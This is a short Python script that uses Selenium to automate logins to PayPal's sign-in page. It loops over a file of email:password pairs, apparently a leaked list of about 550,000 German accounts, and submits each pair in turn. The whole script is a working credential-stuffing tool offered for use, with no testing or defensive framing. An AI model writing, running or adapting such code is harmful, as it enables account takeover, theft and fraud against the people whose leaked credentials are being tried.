import time

from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException

driver = webdriver.Chrome()


file = open("550kGermany.txt", "r")
for i in file:
    user,pasw = i.split(":")
    pasw = pasw.strip()

    driver.get("https://www.paypal.com/signin/")
    driver.fullscreen_window()
    driver.find_element_by_id("email").send_keys(user)
    driver.find_element_by_id("btnNext").click()
    time.sleep(2)
    driver.find_element_by_id("password").send_keys(pasw)
    driver.find_element_by_id("btnLogin").click()





